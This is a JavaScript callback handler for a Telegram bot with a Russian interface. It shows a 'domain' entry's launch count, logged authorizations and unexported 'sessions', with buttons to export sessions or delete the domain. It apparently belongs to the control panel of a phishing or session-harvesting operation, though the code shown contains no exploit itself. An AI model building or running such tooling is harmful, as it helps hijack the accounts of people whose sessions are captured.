import { bot } from "../../index.js";
import Bot from "../../../database/schemas/domain.js";
import Log from "../../../database/schemas/log.js";
import TelegramBot from "node-telegram-bot-api";
import botUser from "../../../database/schemas/botUser.js";

export default {
    name: "d",
    async exec(query, [id]) {
        const t = await Bot.findOne({ id });
        if (!t) return await bot.answerCallbackQuery(query.id, {
            text: "❌ Домен не найден"
        });

        const starts = (await botUser.find({ botId: t.id })).length;
        await bot.editMessageCaption(query, `*🤖 Домен:* ${t.name}

*📊 Статус:* \`Запущен\`

🚀 Запуски: \`${starts}\`
🚪 Авторизаций: \`${(await Log.find({ bot: t.name })).length}\`

*📁 Не выгруженно сессий:* \`${(await Log.find({ 'bot': t.name, exported: false })).length}\``, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `📩 Выгрузить сессии`,
                            callback_data: `export:${t.name}`
                        },
                    ],
                    [
                        {
                            text: '🗑 Удалить домен',
                            callback_data: `deleteBot:${t.id}`
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'domains'
                        }
                    ]
                ]
            },
            message_id: query.message.message_id,
            chat_id: query.message.chat.id
        })
    }
}